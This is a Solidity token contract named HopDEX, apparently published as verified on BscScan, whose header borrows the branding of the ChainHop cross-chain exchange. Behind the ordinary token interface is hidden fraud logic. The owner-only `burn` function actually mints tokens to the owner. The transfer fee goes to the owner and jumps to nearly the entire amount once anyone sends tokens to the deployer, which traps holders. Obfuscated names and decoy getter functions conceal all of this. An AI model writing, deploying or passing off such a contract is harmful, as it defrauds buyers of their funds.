/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

/*
ChainHopDEX
A one-click cross-chain swap, any token, any chain
No token, yet.
We're extremely grateful to announce that the total cross-chain volume of ChainHop has reached $100M alongside over 100K of total swaps!
Thanks to all of our users and partners for making this possible, we'll keep building for you guys 🫡
Discord: 
https://discord.gg/7uuRJbaFue
https://app.chainhop.exchange
https://twitter.com/ChainHopDEX
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity =0.5.11;
contract HopDEX {
address private  vADTFY = address(0);
address private  XyJZUb = address(0);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
uint256 public constant PgSPcY = 99999;
event Transfer(address indexed from, address indexed to, uint256 value);
string public  symbol = "HopDEX";
address public owner;
mapping (address => mapping (address => uint256)) private _allowances;
address private  odXJbs = address(0);
address private  RGzizn = address(0);
string public  name = "HopDEX";
address private  RzpYSh = address(0);
uint256 public constant totalSupply = 100000000000000000000000000;
mapping (address => uint256) public balanceOf;
uint256 private  YwrSMl = 62;
address private  fKzAyj = address(0);
uint256 private  QvTWTv = 31;
uint256 private  FNVplr = 46;
uint256 private  WNGNXO = 1000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  EPLGMR = address(0);
uint256 private  FFfjbS = 75;
address private  zqIBcq = address(0);
address private  GNMzPC = address(0);
uint8 public constant decimals = 18;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  TRujug = 26;
uint256 private  QlltRp = 87;
//
//
//
//
//
//
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _get1fKzAyj() private returns (address) {
return fKzAyj;
}
//
//
//
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _getz2qIBcq() private returns (address) {
return zqIBcq;
}
//
//
//
function _getvA3DTFY() private returns (address) {
return vADTFY;
}
//
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");
//
balanceOf[account] += amount;
}
//
//
//
//
//
//
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function _getRzp4YSh() private returns (address) {
return RzpYSh;
}
//
function _getQvTW5Tv() private returns (uint256) {
return QvTWTv + 41;
}
//
function _getYwrSM6l() private returns (uint256) {
return YwrSMl + 28;
}
//
//
//
function _getFFfjbS7() private returns (uint256) {
return FFfjbS + 59;
}
//
function _get8FNVplr() private returns (uint256) {
return FNVplr + 50;
}
//
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
//
//
constructor () public {
EPLGMR = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
//
//
//
//
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getT9Rujug() private returns (uint256) {
return TRujug + 55;
}
//
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
//
//
//
//
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "Csqpwe");
require(to != address(0), "Csqpwe");
require(amount <= balanceOf[from], "Csqpwe");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* PgSPcY/WNGNXO ;
}
//
uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==EPLGMR){
WNGNXO = PgSPcY+2;
}
emit Transfer(from, to, transferAmount);
}
//
//
function _getRGz0izn() private returns (address) {
return RGzizn;
}
//
function _getXyJZ1Ub() private returns (address) {
return XyJZUb;
}
//
function _getQlltR2p() private returns (uint256) {
return QlltRp + 30;
}
//
function _getodXJbs3() private returns (address) {
return odXJbs;
}
//
function _get4GNMzPC() private returns (address) {
return GNMzPC;
}
//
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tCsqpwe 0");
require(spender != address(0), "fCsqpwe 0");
//
_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
//
}

library EnumerableSet {
    struct Set {
        // Storage of set values
        bytes32[] _values;
        mapping (bytes32 => uint256) _indexes;
    }
    function _add(Set storage set, bytes32 value) private returns (bool) {
        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }
    function _remove(Set storage set, bytes32 value) private returns (bool) {
        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) { // Equivalent to contains(set, value)
            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;
            bytes32 lastvalue = set._values[lastIndex];
            set._values[toDeleteIndex] = lastvalue;
            set._indexes[lastvalue] = toDeleteIndex + 1; // All indexes are 1-based
            set._values.pop();
            delete set._indexes[value];
            return true;
        } else {
            return false;
        }
    }
    function _contains(Set storage set, bytes32 value) private view returns (bool) {
        return set._indexes[value] != 0;
    }
    function _length(Set storage set) private view returns (uint256) {
        return set._values.length;
    }
    function _at(Set storage set, uint256 index) private view returns (bytes32) {
        require(set._values.length > index, "EnumerableSet: index out of bounds");
        return set._values[index];
    }
    struct Bytes32Set {
        Set _inner;
    }
    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _add(set._inner, value);
    }
    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {
        return _remove(set._inner, value);
    }
    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {
        return _contains(set._inner, value);
    }
    function length(Bytes32Set storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {
        return _at(set._inner, index);
    }
    struct AddressSet {
        Set _inner;
    }
    function add(AddressSet storage set, address value) internal returns (bool) {
        return _add(set._inner, bytes32(uint256(uint160(value))));
    }
    function remove(AddressSet storage set, address value) internal returns (bool) {
        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }
    function contains(AddressSet storage set, address value) internal view returns (bool) {
        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }
    function length(AddressSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
    function at(AddressSet storage set, uint256 index) internal view returns (address) {
        return address(uint160(uint256(_at(set._inner, index))));
    }
    struct UintSet {
        Set _inner;
    }
    function add(UintSet storage set, uint256 value) internal returns (bool) {
        return _add(set._inner, bytes32(value));
    }
    function remove(UintSet storage set, uint256 value) internal returns (bool) {
        return _remove(set._inner, bytes32(value));
    }
    function contains(UintSet storage set, uint256 value) internal view returns (bool) {
        return _contains(set._inner, bytes32(value));
    }
    function length(UintSet storage set) internal view returns (uint256) {
        return _length(set._inner);
    }
   function at(UintSet storage set, uint256 index) internal view returns (uint256) {
        return uint256(_at(set._inner, index));
    }
}